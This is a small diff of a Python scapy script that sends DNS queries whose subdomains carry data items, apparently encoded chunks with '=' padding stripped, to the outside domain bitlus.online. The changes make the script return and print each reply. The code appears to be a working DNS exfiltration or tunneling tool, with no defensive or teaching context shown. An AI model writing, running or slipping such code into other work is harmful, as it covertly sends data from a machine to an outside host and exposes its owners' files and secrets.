@@ -10,7 +10,7 @@ finally:
 def dns_request(sub_domain):
     dns_req = IP(dst='8.8.8.8')/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=f'{sub_domain}.bitlus.online'))
     answer = sr1(dns_req, verbose=0)
-    #return answer
+    return answer
 
 dir = os.getcwd()
 
@@ -22,4 +22,4 @@ for item in list:
     item = item.decode('utf-8')
     if "=" in item:
         item = item.replace("=", "")
-    dns_request(item)
+    print(dns_request(item))
